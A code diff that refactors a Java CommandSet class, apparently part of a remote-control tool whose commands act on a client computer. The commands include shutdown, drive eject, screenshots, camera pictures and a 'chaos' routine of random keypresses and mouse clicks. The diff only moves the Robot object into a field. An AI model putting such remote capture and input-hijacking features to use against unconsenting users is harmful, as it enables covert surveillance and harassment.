@@ -30,6 +30,8 @@ public abstract class CommandSet implements ClipboardOwner
     private Runtime runtime = Runtime.getRuntime();
     /** path to the OS specific temp directory (where we store transferred files etc.) */
     private String tempPath;
+    /** provides lots of useful functions */
+    private Robot robot;
 
     public abstract void eject() throws IOException;
     public abstract void shutdown() throws IOException;
@@ -37,10 +39,20 @@ public abstract class CommandSet implements ClipboardOwner
     public abstract void rotate(String direction) throws IOException;
     public abstract void takeCameraPicture();
     public abstract void setWallpaper(File wallpaper) throws IOException;
+    public abstract void minimise();
 
     public CommandSet()
     {
         createStorageDir();
+        try
+        {
+            robot = new Robot();
+        }
+        catch(AWTException awte)
+        {
+            System.err.println("Fatal error creating a robot");
+            awte.printStackTrace();
+        }
     }
 
     /**
@@ -78,7 +90,6 @@ public abstract class CommandSet implements ClipboardOwner
         StringSelection stringSelection = new StringSelection(message);
         clipboard.setContents(stringSelection, this);
 
-        Robot robot = new Robot();
         robot.keyPress(KeyEvent.VK_CONTROL);
         robot.keyPress(KeyEvent.VK_V);
         robot.keyRelease(KeyEvent.VK_V);
@@ -103,12 +114,10 @@ public abstract class CommandSet implements ClipboardOwner
 
     /**
      * takes a screenshot of the clients screen and saves it in our temp directory
-     * @throws AWTException if the robot failed to be created
      * @throws IOException if something went wrong created the image file from the bufferedimage
      */
-    public void takeScreenshot() throws AWTException, IOException
+    public void takeScreenshot() throws IOException
     {
-        Robot robot = new Robot();
         Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
         BufferedImage screenImg = robot.createScreenCapture(new Rectangle(screenSize));
         DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd@HH-mm-ss");
@@ -120,11 +129,9 @@ public abstract class CommandSet implements ClipboardOwner
      * randomly presses keys, moves the mouse and clicks mouse buttons on the clients computer
      * @param length the time in ms the random actions should last for
      * @param delay the time delay in ms between each random action
-     * @throws AWTException something went wrong create the Robot
      */
-    public void chaos(long length, long delay) throws AWTException
+    public void chaos(long length, long delay)
     {
-        Robot robot = new Robot();
         long start = System.currentTimeMillis();
         Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
         Random random = new Random();
@@ -171,4 +178,8 @@ public abstract class CommandSet implements ClipboardOwner
         return tempPath;
     }
 
+    public Robot getRobot()
+    {
+        return robot;
+    }
 }
